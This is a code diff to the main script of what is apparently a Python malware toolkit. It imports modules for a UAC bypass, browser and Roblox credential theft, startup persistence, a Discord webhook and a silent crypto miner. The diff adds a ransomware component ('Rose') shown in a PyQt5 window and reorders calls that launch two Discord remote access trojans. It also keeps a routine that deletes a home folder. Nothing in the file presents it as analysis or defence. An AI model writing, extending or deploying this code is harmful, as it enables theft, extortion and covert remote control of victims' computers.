@@ -10,6 +10,10 @@ from uac_bypass import GetSelf, IsAdmin, UACbypass
 from browser import Browsers
 from startup import Startup
 import _roblox
+from ransomware import Rose
+import PyQt5
+import PyQt5.QtWidgets
+import PyQt5.QtCore
 from config import Config
 from __webhook import _WebhookX
 from crypto_miner import miner
@@ -308,23 +312,11 @@ if cc.get_ipinf_stealing():
     except Exception as e:
         send_error_notification(e, 'IP & Wi-Fi Data')
 
-if cc.get_rose_discord_rat():
-    try:
-        rose_rat.run_rat()
-    except Exception as e:
-        send_error_notification(e, 'Remote Access')
-
 if cc.silent_crypto_miner():
     try:
         miner.run_miner()
     except Exception as e:
         send_error_notification(e, 'Silent Crypto Miner')
-
-if cc.get_knight_discord_rat():
-    try:
-        knight_rat.run_rat()
-    except Exception as e:
-        send_error_notification(e, '| Knight Remote Access')
 
 class remove_homefold():
     if os.path.exists(main_path):
@@ -332,3 +324,20 @@ class remove_homefold():
             shutil.rmtree(main_path)
         except Exception as e:
             send_device_information(e, 'Home Remover')
+
+if cc.get_ransomware():
+    app = PyQt5.QtWidgets.QApplication(sys.argv) 
+    l = Rose()
+    sys.exit(app.exec())
+
+if cc.get_knight_discord_rat():
+    try:
+        knight_rat.run_rat()
+    except Exception as e:
+        send_error_notification(e, '| Knight Remote Access')
+
+if cc.get_rose_discord_rat():
+    try:
+        rose_rat.run_rat()
+    except Exception as e:
+        send_error_notification(e, 'Remote Access')
